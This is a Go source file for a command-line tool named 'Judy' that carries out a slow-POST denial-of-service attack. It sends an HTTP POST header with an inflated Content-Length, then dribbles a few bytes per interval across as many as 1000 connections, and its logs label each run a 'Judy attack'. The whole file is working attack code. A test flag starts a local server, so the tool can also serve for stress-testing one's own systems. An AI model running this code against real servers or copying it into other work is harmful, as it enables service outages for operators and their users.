package judy

import (
	"flag"
	"net"
	"net/url"
	"os"
	"strconv"
	"time"

	"github.com/andrewflbarnes/snacks/pkg/strs"
	"github.com/andrewflbarnes/snacks/pkg/udy"

	"github.com/andrewflbarnes/snacks/internal/flags"
	"github.com/andrewflbarnes/snacks/internal/helper"
	"github.com/andrewflbarnes/snacks/pkg/http"
	log "github.com/sirupsen/logrus"
)

var (
	logger = log.WithFields(log.Fields{})

	flagsJudy   = flag.NewFlagSet("judy", flag.ExitOnError)
	flagOnce    = flagsJudy.Bool("once", false, "Establish a single connection")
	flagTime    = flagsJudy.Duration("time", time.Hour, "How long to run the test for (not applicable if -once enabled)")
	flagTest    = flagsJudy.Bool("test", false, "Runs an embedded server to connect to")
	flagSize    = flagsJudy.Int("size", 1_000_000, "The size of the request payload to send")
	flagDelay   = flagsJudy.Duration("sd", 1*time.Second, "The delay in ms between each send")
	flagBytes   = flagsJudy.Int("sb", 5, "The number of bytes to send in each send")
	flagMax     = flagsJudy.Int("max", 1000, "The maximum number of connections to establish")
	flagContent = flagsJudy.String("type", http.ApplicationJSON.String(), "The content type of data to send")
	flagPrefix  = flagsJudy.String("prefix", "", "The payload prefix to use, should be used for custom types")

	logFlags  = flags.InitLogFlags(flagsJudy)
	authFlags = flags.InitAuthFlags(flagsJudy)

	dest *url.URL
)

func Judy() {
	flagsJudy.Parse(os.Args[2:])
	logFlags.Apply()

	var urlString string
	if len(flagsJudy.Args()) > 0 {
		urlString = flagsJudy.Args()[0]
	} else {
		urlString = "http://localhost:80"
	}
	dest = helper.ParseUrl(urlString)

	test := *flagTest
	size := *flagSize
	once := *flagOnce
	sendBytes := *flagBytes
	sendDelay := *flagDelay
	duration := *flagTime
	maxConns := *flagMax

	logger.Info("Starting")

	// Create a new Udy instance
	dataProvider := udy.FixedByteDataProvider(sendBytes)
	sendStrategy := udy.FixedSendStrategy{DelayPerSend: sendDelay}
	l := udy.New(dataProvider, sendStrategy, maxConns)

	if test {
		// Start a server which will receive the payload
		serverReady := make(chan bool)
		go helper.HttpServer(dest.Port(), serverReady)
		<-serverReady
	}

	prefix := getPayloadPrefix()

	if once {
		logExecutionDetails("single", prefix)

		executeOnce(l, prefix)

		logger.Info("Judy attack complete")
	} else {
		logExecutionDetails("continuous", prefix)

		go l.ExecuteContinuous(dest, prefix, size)

		time.Sleep(duration)
		// l.Stop()

		logger.WithFields(log.Fields{
			"duration": duration,
		}).Info("Judy attack complete")

		time.Sleep(sendDelay)
	}
}

func logExecutionDetails(execution string, prefix []byte) {
	if strs.IsPrintable(prefix) {
		logger.Infof("Prefix:\n%s", prefix)
	}
	logger.WithFields(log.Fields{
		"type":      execution,
		"dest":      dest,
		"size":      *flagSize,
		"duration":  *flagTime,
		"test":      *flagTest,
		"sendBytes": *flagBytes,
		"sendDelay": *flagDelay,
		"maxConns":  *flagMax,
		"content":   *flagContent,
	}).Info("Starting Judy attack")
}

func executeOnce(l udy.Udy, prefix []byte) {
	size := *flagSize
	target := dest.Host

	conn, err := net.Dial("tcp", target)
	if err != nil {
		logger.WithFields(log.Fields{
			"target": target,
		}).Fatal("Unable to establish connection")
	}

	done := l.Execute(conn, prefix, size)
	// Wait for the payload to finish sending
	<-done
}

func getPayloadPrefix() []byte {
	size := *flagSize
	host := dest.Host
	endpoint := dest.Path
	verb := http.Post

	media := helper.ToContentType(*flagContent)
	var contentTypePrefix []byte
	if len(*flagPrefix) > 0 {
		contentTypePrefix = []byte(*flagPrefix)
	} else {
		contentTypePrefix = helper.GetPayloadPrefix(media)
	}
	contentTypePrefixLen := len(contentTypePrefix)

	headers := map[string]string{
		"Content-Type":   media.String(),
		"Accept":         "*/*",
		"Content-Length": strconv.Itoa(size + contentTypePrefixLen),
		"Host":           host,
	}

	auth, ok := authFlags.GetAuth()
	if ok {
		headers["Authorization"] = auth
	}

	builder := http.HttpRequestBuilder{
		Proto:    http.Http11,
		Verb:     verb,
		Endpoint: endpoint,
		Body:     "",
		Headers:  headers,
	}

	httpRequest := builder.BuildBytes()
	return append(httpRequest, contentTypePrefix...)
}
